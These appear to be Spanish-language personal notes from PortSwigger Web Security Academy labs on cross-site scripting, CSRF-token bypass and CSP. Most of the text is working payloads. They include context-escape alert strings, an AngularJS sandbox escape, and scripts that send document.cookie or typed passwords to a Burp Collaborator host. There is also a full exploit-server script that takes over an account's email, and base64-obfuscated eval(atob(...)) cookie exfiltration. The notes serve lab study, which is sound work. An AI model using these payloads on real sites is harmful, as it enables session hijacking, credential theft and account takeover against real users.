LABS

1. `{{$on.constructor('alert(1)')()}}` -> usaba angular js 1.7.7 dependencia vulnerable, además nuestro input iba dentro de ng-app haciendo posible que se renderice cosas como {{1+1}} 
2. Dentro de `href` se puede ejecutar java script con `javascript:alert(1)`
3. si estamos dentro de la declaración de una variable habra que usar `-alert()-` para que sea una sintaxis válida
4. Si dentro de una variable no podemos escapar y ejecutar xss también podríamos hacer : `</script><script>alert(1)</script>`
5. Si no podemos inyectar ningun carácter raro para poner un alert pero nuestro input se pasa a una funcion podríamos poner el valor del carácter que nos bannea pero encodeado en html para que cuando sea pasado a la función lo utilice como el carácter que queremos, ejemplo:
&apos; -> '

esto funciona porque estabamos en contexto html en un atributo onclick

6. Si escapa back ticks -> ò (el de la tilde del revés) , es porque probablemente esté usando un template y una forma de ejecutar javascript en un template es `${alert(1)}`
7. Robar cookies con burp collaborator:
```
<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```
8. Robar contraseñas

```
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
9. para saltarse una defensa csrf :
```
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
```
10. XSS con hashchange 

```
https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'
```


11. 
VER SIEMPRE si hacemos un GET a una pagina que no existe , ver si podemos hacer xsss

EXPLOIT SERVER

```
<iframe src="http payload"></iframe>
```

```
<script>
loaction='http payload';
<script>
```
12. Si sabemos que el usuario presiona la letra X por ejemplo, podríamos hacer un xss de esta manera : `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)` esto claro está si se refleja lo que nosotros ponemos detrás de ? en algun sitio

## CSP

CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages.


La web hace un POST para cambiar el email,

si el body de email se lo ponemos en la url nos deja inyectar html pero todavía nos queda en el body el csrf token

`https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>`

el token no se pone en la url puesto que es post así que con el html inyectado pondremos que la petición sea get para saltarnos el token csrf

`https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>`

ahora al darle al boton nos redirige al exploit server pero con el token csrf en la url : https://exploit-0a1d00c603236cf1808f020901000061.exploit-server.net/exploit?email=foo%40bar&csrf=tWfdCZnprNuTNSjgCOlmSRgsWq6fVPar

script para el exploit server 

```
<body> 
<script> 
// Define the URLs for the lab environment and the exploit server. const 

academyFrontend = "https://your-lab-url.net/"; const exploitServer = "https://your-exploit-server.net/exploit"; 
// Extract the CSRF token from the URL. 

const url = new URL(location); const csrf = url.searchParams.get('csrf'); 
// Check if a CSRF token was found in the URL. 

if (csrf) { // If a CSRF token is present, create dynamic form elements to perform the attack. 

const form = document.createElement('form'); 
const email = document.createElement('input'); 
const token = document.createElement('input'); 
// Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures. 

token.name = 'csrf'; token.value = csrf; 
// Configure the new email address intended to replace the user's current email. 

email.name = 'email'; email.value = 'hacker@evil-user.net'; 
// Set the form attributes, append the form to the document, and configure it to automatically submit. 

form.method = 'post'; 
form.action = `${academyFrontend}my-account/change-email`; 
form.append(email); 
form.append(token); 
document.documentElement.append(form); 
form.submit(); 
// If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request 
}
 else {
  location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`; } </script> </body>
```


## Comprobaciones de bloqueos

No bloquea <> -> via libre
Está en una variable y no bloquea - ni ' -> `'-alert()-'`
Está en una variable y no bloquea \ ni -  -> `\'-alert(1)//
El input se pasa a una función -> encodear en html Ej.  `'`-> `&apos;`
Escapa backticks -> usa template -> `${alert(1)}`


Si no puedes bypassear por algún carácter usa la función atob así:


url?c=eval(atob(fetch(url exploit/?c='+document.cookie)))

ejemplo : 

```
<script>
document.location="https://0a9600db0351614a80bb035b0057000a.web-security-academy.net/?SearchTerm=%22-eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYWZmMDAxMzAzNmI2MTZkODA2NzAyYjMwMWM4MDBmZi5leHBsb2l0LXNlcnZlci5uZXQvP2M9Jytkb2N1bWVudC5jb29raWUp'))-%22";
</script>
```


si fetch no va puedes usar location

```
"}; location=”https://BURP-COLLABORATOR-URL/?”+document.cookie; //
```

pregunta porque funciona esto : "-Function`X${document.location="https://exploit-0a40003e035781c0809c610401a9003d.exploit-server.net/?"+document.cookie}```-"
